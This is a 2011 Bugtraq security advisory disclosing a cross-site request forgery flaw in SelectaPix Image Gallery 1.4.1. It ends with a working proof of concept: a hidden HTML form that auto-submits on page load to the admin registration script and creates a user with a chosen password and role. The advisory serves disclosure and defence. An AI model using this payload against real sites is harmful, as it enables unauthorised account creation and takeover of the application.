
Date: Tue, 3 May 2011 15:27:20 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: HTB22963: CSRF (Cross-Site Request Forgery) in SelectaPix Image Gallery

Vulnerability ID: HTB22963
Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_selectapix_image_gallery.html
Product: SelectaPix Image Gallery
Vendor: http://www.outofthetrees.co.uk/ ( http://www.outofthetrees.co.uk/ ) 
Vulnerable Version: 1.4.1
Vendor Notification: 19 April 2011 
Vulnerability Type: CSRF (Cross-Site Request Forgery)
Risk level: Low 
Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
The vulnerability exists due to failure in the "/admin/register_new.php" script to properly verify the source of HTTP request.
Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
Attacker can use browser to exploit this vulnerability. The following PoC is available:


<form action="http://[host]/admin/register_new.php" method="post" name="main" id="main">
<input type="hidden" name="email" value="test@...t.com">
<input type="hidden" name="username" value="test">
<input type="hidden" name="passwd" value="123456">
<input type="hidden" name="passwd2" value="123456">
<input type="hidden" name="RoleID" value="4">
<input type="submit" id="btn"> 
</form>
<script>
document.getElementById('btn').click();
</script>



